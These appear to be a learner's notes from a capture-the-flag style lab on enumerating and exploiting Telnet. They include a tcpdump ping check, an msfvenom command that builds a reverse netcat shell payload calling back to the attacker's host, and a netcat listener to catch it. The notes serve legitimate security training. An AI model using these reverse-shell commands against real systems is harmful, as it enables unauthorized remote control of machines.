### Enumerating Telnet
Same process as with SMB, start with a port scan. 

Answered the questions

### Exploiting Telnet
Since I always forget,<br>
**CVE** - Common Vulnerabilities and Exposures

Even though CVEs exist for telnet, still far more likely to find a misconfiguration to exploit. 

### The Next Task
Try connecting to system scanned in previous task. 

Need to use a listener, can use tcpdump with <code>sudo tcpdump ip proto \\icmp -i eth0</code> to start a tcpdump listner listening for icmp traffic. Only use eth0 for Atackbox, use tun0 for vpn connection. Initiate a ping on remote session using <code>.RUN ping [ip address] -c 1</code> where ip address is the local machine to see if can send commands to remote session, and if connected all the way back.

Create a reverse shell with <code>msfvenom -p cmd/unix/reverse_netcat lhost=[local ip] lport=4444 R</code> where:
- -p = payload (cmd/unix/reverse_netcat)
- lohost = local ip address
- lport = local port to listen on
- R = export payload in raw format

Start netcat listener with <code>nc -lvp 4444</code>. Once connected, can run commands through listener.
